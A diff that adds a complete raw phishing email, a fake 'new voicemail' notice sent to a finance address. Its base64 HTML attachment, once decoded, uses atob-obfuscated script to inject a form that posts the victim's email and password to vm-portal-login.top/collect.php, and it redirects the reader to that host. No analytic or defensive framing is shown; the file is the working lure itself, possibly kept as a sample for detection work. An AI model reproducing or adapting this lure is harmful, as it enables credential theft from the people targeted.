@@ -1,0 +1,42 @@
+Received: from smtp.vm-notify-cloud.net (smtp.vm-notify-cloud.net [193.29.13.40])
+	by mx.example.org with ESMTP; Thu, 16 Oct 2025 13:05:44 +0000
+Authentication-Results: mx.example.org;
+	spf=softfail smtp.mailfrom=vm-notify-cloud.net;
+	dkim=none;
+	dmarc=none
+From: "Voice Mail System" <voicemail@vm-notify-cloud.net>
+To: finance@example.org
+Subject: New voicemail from +44 20 7946 0812 (0:47)
+Date: Thu, 16 Oct 2025 13:05:40 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="vm"
+
+--vm
+Content-Type: text/plain; charset="utf-8"
+
+You received a new voice message (0:47).
+Open the attached file to listen. The message will be deleted in 24 hours.
+
+--vm
+Content-Type: text/html; name="VM_0812_Play.html"
+Content-Disposition: attachment; filename="VM_0812_Play.html"
+Content-Transfer-Encoding: base64
+
+PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlZvaWNlIE1lc3NhZ2U8L3RpdGxlPjwv
+aGVhZD48Ym9keT4KPGgzPllvdSBoYXZlICgxKSBuZXcgdm9pY2UgbWVzc2FnZTwvaDM+CjxkaXYg
+aWQ9ImMiPjwvZGl2Pgo8c2NyaXB0PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjJykuaW5uZXJI
+VE1MID0gYXRvYigiUEdadmNtMGdZV04wYVc5dVBTSm9kSFJ3Y3pvdkwzWnRMWEJ2Y25SaGJDMXNi
+MmRwYmk1MGIzQXZZMjlzYkdWamRDNXdhSEFpSUcxbGRHaHZaRDBpY0c5emRDSStQR2x1Y0hWMElH
+NWhiV1U5SW1WdFlXbHNJajQ4YVc1d2RYUWdkSGx3WlQwaWNHRnpjM2R2Y21RaUlHNWhiV1U5SW5C
+M0lqNDhMMlp2Y20wK1BITmpjbWx3ZEQ1elpYUlVhVzFsYjNWMEtHWjFibU4wYVc5dUtDbDdkMmx1
+Wkc5M0xteHZZMkYwYVc5dUxtaHlaV1k5SW1oMGRIQnpPaTh2ZG0wdGNHOXlkR0ZzTFd4dloybHVM
+blJ2Y0M5aGRYUm9MeUk3ZlN3ME1EQXdLVHd2YzJOeWFYQjBQZz09Iik7PC9zY3JpcHQ+CjwhLS0g
+UEdadmNtMGdZV04wYVc5dVBTSm9kSFJ3Y3pvdkwzWnRMWEJ2Y25SaGJDMXNiMmRwYmk1MGIzQXZZ
+MjlzYkdWamRDNXdhSEFpSUcxbGRHaHZaRDBpY0c5emRDSStQR2x1Y0hWMElHNWhiV1U5SW1WdFlX
+bHNJajQ4YVc1d2RYUWdkSGx3WlQwaWNHRnpjM2R2Y21RaUlHNWhiV1U5SW5CM0lqNDhMMlp2Y20w
+K1BITmpjbWx3ZEQ1elpYUlVhVzFsYjNWMEtHWjFibU4wYVc5dUtDbDdkMmx1Wkc5M0xteHZZMkYw
+YVc5dUxtaHlaV1k5SW1oMGRIQnpPaTh2ZG0wdGNHOXlkR0ZzTFd4dloybHVMblJ2Y0M5aGRYUm9M
+eUk3ZlN3ME1EQXdLVHd2YzJOeWFYQjBQZz09IC0tPgo8c2NyaXB0PmxvY2F0aW9uLnJlcGxhY2Uo
+Imh0dHBzOi8vdm0tcG9ydGFsLWxvZ2luLnRvcC9saXN0ZW4/aWQ9MDgxMiIpOzwvc2NyaXB0Pgo8
+L2JvZHk+PC9odG1sPgo=
+--vm--
